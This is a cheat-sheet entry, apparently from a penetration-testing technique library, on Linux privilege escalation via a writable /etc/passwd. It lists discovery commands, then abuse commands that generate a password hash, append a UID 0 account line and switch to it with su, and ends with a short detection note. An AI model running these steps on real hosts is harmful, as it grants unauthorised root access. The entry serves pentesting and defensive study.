---
technique: Writable Passwd
category: privilege-escalation
targets: Linux
tags: linux privilege-escalation passwd shadow local
---

# Writable Passwd

Writable account databases let a low-privileged user add or modify local root-equivalent accounts.

## Prerequisites

| Condition | Notes |
|-----------|-------|
| Write access | Required on `/etc/passwd` or an equivalent account database |
| Valid shell | The target host must permit the selected login shell |
| Password hash | Use a supported hash format for the target system |

## Discovery

### Passwd permissions

#sh #filesystem #recon

Check account database ownership and mode.

```sh title:"Check passwd permissions"
ls -l /etc/passwd
```
<!-- cheat -->

### Shadow permissions

#sh #filesystem #recon

Check whether shadow hashes are exposed or writable.

```sh title:"Check shadow permissions"
ls -l /etc/shadow
```
<!-- cheat -->

### UID 0 accounts

#sh #accounts #recon

List local accounts with UID 0.

```sh title:"List UID zero accounts"
awk -F: '$3 == 0 {print}' /etc/passwd
```
<!-- cheat -->

## Abuse

### Generate password hash

#sh #openssl

Generate a passwd-compatible MD5-crypt hash.

```sh title:"Generate passwd hash"
openssl passwd -1 "$pass"
```
<!-- cheat
import passwords
-->

### Step 1: Append root-equivalent account

#sh #passwd

Append a prepared passwd line for a UID 0 account.

```sh title:"Append passwd account line"
printf '%s\n' "$passwd_line" >> /etc/passwd
```
<!-- cheat
var passwd_line
-->

### Step 2: Switch to added account

#sh #su

Authenticate as the added root-equivalent account.

```sh title:"Switch to added root account"
su - "$user"
```
<!-- cheat
import users
-->

## Detection

Monitor account database writes, new UID 0 accounts, and mismatches between `/etc/passwd` and `/etc/shadow`.
